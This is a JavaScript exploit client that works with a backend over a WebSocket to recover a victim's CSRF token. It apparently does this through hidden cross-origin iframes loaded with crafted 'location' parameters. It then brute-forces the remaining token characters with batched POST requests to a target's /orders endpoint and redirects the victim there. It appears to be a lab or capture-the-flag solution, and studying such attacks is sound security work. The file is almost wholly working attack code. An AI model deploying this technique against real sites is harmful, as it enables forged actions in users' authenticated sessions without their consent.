const TARGET = "https://172.31.217.234:5000"

let i = 0
let done = false
let token = ''
const CSRF_LEN = 32

const sock = new WebSocket(`ws://${window.location.host}/crack`)
sock.onopen = () => {
    sock.send("ready")
    aesthetic_cycle()
}

const HEX_ALPHABET = '0123456789abcdef'
function loaded(){
    sock.send("page_loaded")
}


async function aesthetic_cycle(){
    while(!done){
        i = (i + 1) % HEX_ALPHABET.length
        document.getElementById("csrf").textContent = token + HEX_ALPHABET[i]
        await new Promise(r => setTimeout(r,250))
    }
}

async function submit(){
    const total_requests = (HEX_ALPHABET.length)**(CSRF_LEN - token.length)
    if(total_requests < 1000){
        const headers = {"Content-Type": "application/x-www-form-urlencoded"}
        const location = "US"
        const current_promises = new Map()
        for(let i = 0; i < total_requests;i+=1){
            let test_token = new Array(CSRF_LEN-token.length).fill(0)
            let x = i
            for(let j = test_token.length-1;x > 0;j-=1){
                test_token[j] = x % 16
                x = Math.floor(x/16)
            }
            let suffix = test_token.map(v => HEX_ALPHABET[v]).join()
            let csrf = token + suffix
            let body = new URLSearchParams({csrf, location}).toString()
            if(current_promises.size == 10){
                let k = await Promise.race(current_promises.values())
                current_promises.delete(k)
            }
            current_promises.set(suffix,(
                fetch(`${TARGET}/orders`,{method: "POST", headers, body}).catch(r => suffix)
            ))
        }
        await Promise.all(current_promises.values())
        window.location.href = `${TARGET}/orders`
    }
    else{
        alert(`Failure: Would have needed to issue too many brute force requests: ${total_requests}`)
    }
}

sock.onmessage = msg => {
    const [command, data] = msg.data.split('\n',limit=2)
    if(command === "iframe"){
        const new_frame = document.createElement('iframe')
        new_frame.setAttribute("src",`${TARGET}/?location=${data}`)
        new_frame.setAttribute("hidden","true")
        new_frame.setAttribute("onload","loaded()")
        document.getElementById("frame_wrapper").innerHTML = ""
        document.getElementById("frame_wrapper").appendChild(new_frame)
    }else if(command === "update_token"){
        token = data
        i = 0
    }else if(command === "done"){
        const [description, value] = data.split(':',limit=2)
        alert(description)
        document.getElementById("csrf").textContent = value
        token = value        
        done = true
        sock.close()
        if(description !== 'error')
            submit()
    }
}

